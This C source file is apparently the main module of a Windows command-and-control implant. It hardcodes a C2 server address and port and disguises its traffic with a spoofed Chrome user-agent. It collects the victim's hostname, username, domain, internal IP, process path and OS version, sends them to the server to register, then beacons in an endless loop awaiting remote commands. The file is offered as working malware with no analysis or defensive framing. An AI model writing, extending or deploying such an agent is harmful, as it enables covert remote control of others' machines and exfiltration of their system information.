#include "Command.h"
#include "Package.h"
#include "Transport.h"
#include <stdio.h>
#include <iptypes.h>
#include <iphlpapi.h>
#include <winternl.h>

#define CONFIG_HOST       L"192.168.203.129"
#define CONFIG_PORT       8080
#define CONFIG_USERAGENT  L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
#define CONFIG_SLEEP      10

UINT32          g_AgentID       = 0;
DWORD           g_SleepTime     = CONFIG_SLEEP;
BOOL            g_Connected     = FALSE;
TRANSPORT_CFG   g_TransportCfg  = { 0 };

UINT32 GenAgentID(){
    HMODULE ntdll = GetModuleHandleA("ntdll");
    ULONG (WINAPI *pRtlRandomEx)(PULONG) = (VOID*)GetProcAddress(ntdll, "RtlRandomEx");

    ULONG seed = GetTickCount();
    seed = pRtlRandomEx(&seed);
    seed = pRtlRandomEx(&seed);
    return seed & 0x7FFFFFFF;
}

BOOL Register(){
    PPACKAGE         pkg     = PackageCreate(COMMAND_REGISTER);
    PVOID            resp    = NULL;
    SIZE_T           sz      = 0;
    PVOID            buf     = NULL;
    SIZE_T           len     = 0;
    PIP_ADAPTER_INFO adapter = NULL;
    OSVERSIONINFOEXW osver   = { 0 };
    SYSTEM_INFO      sysinfo = { 0 };

    // agent id
    PackageAddInt32(pkg, g_AgentID);

    // hostname
    len = 0;
    GetComputerNameExA(ComputerNameNetBIOS, NULL, (LPDWORD)&len);
    if (len > 0 && (buf = LocalAlloc(LPTR, len))){
        GetComputerNameExA(ComputerNameNetBIOS, buf, (LPDWORD)&len);
        PackageAddBytes(pkg, buf, len);
        LocalFree(buf); buf = NULL;
    } else PackageAddBytes(pkg, (PUCHAR)"", 0);

    // username
    len = MAX_PATH;
    if ((buf = LocalAlloc(LPTR, len))){
        GetUserNameA(buf, (LPDWORD)&len);
        PackageAddBytes(pkg, buf, strlen(buf));
        LocalFree(buf); buf = NULL;
    } else PackageAddBytes(pkg, (PUCHAR)"", 0);

    // domain
    len = 0;
    GetComputerNameExA(ComputerNameDnsDomain, NULL, (LPDWORD)&len);
    if (len > 0 && (buf = LocalAlloc(LPTR, len))){
        GetComputerNameExA(ComputerNameDnsDomain, buf, (LPDWORD)&len);
        PackageAddBytes(pkg, buf, len);
        LocalFree(buf); buf = NULL;
    } else PackageAddBytes(pkg, (PUCHAR)"", 0);

    // internal ip
    len = 0;
    GetAdaptersInfo(NULL, (PULONG)&len);
    if ((adapter = LocalAlloc(LPTR, len))){
        if (GetAdaptersInfo(adapter, (PULONG)&len) == NO_ERROR)
            PackageAddBytes(pkg, (PUCHAR)adapter->IpAddressList.IpAddress.String, strlen(adapter->IpAddressList.IpAddress.String));
        else
            PackageAddBytes(pkg, (PUCHAR)"0.0.0.0", 7);
        LocalFree(adapter); adapter = NULL;
    } else PackageAddBytes(pkg, (PUCHAR)"0.0.0.0", 7);

    // process path
    len = MAX_PATH;
    if ((buf = LocalAlloc(LPTR, len))){
        len = GetModuleFileNameA(NULL, buf, len);
        PackageAddBytes(pkg, buf, len);
        LocalFree(buf); buf = NULL;
    } else PackageAddBytes(pkg, (PUCHAR)"", 0);

    // pid, ppid
    PackageAddInt32(pkg, GetCurrentProcessId());
    PackageAddInt32(pkg, 0);

    // process arch
    #ifdef _WIN64
    PackageAddInt32(pkg, 15);   
    #else
    PackageAddInt32(pkg, 10);   
    #endif

    // elevated
    PackageAddInt32(pkg, FALSE);

    osver.dwOSVersionInfoSize = sizeof(osver);
    HMODULE ntdll = GetModuleHandleA("ntdll");
    VOID (WINAPI *pRtlGetVersion)(POSVERSIONINFOEXW) =
        (VOID*)GetProcAddress(ntdll, "RtlGetVersion");
    pRtlGetVersion(&osver);

    PackageAddInt32(pkg, osver.dwMajorVersion);
    PackageAddInt32(pkg, osver.dwMinorVersion);
    PackageAddInt32(pkg, osver.wProductType);
    PackageAddInt32(pkg, osver.wServicePackMajor);
    PackageAddInt32(pkg, osver.dwBuildNumber);

    // os arch 
    GetNativeSystemInfo(&sysinfo);
    PackageAddInt32(pkg, sysinfo.wProcessorArchitecture);

    PackageAddInt32(pkg, g_SleepTime);

    if (!PackageTransmit(pkg, &resp, &sz))
        return FALSE;

    if (!resp || sz < 4)
        return FALSE;

    UINT32 got = *(UINT32*)resp;
    printf("register: sent=0x%x got=0x%x\n", g_AgentID, got);
    LocalFree(resp);

    if (got == g_AgentID){
        g_Connected = TRUE;
        return TRUE;
    }
    return FALSE;
}

INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, INT nShow){
    g_TransportCfg.UserAgent = CONFIG_USERAGENT;
    g_TransportCfg.Host      = CONFIG_HOST;
    g_TransportCfg.Port      = CONFIG_PORT;
    g_TransportCfg.Secure    = FALSE;

    g_AgentID = GenAgentID();
    printf("agent id: 0x%x\n", g_AgentID);

    do {
        if (!g_Connected){
            if (Register())
                CommandDispatcher();
        }
        Sleep(g_SleepTime * 1000);
    } while (TRUE);

    return 0;
}
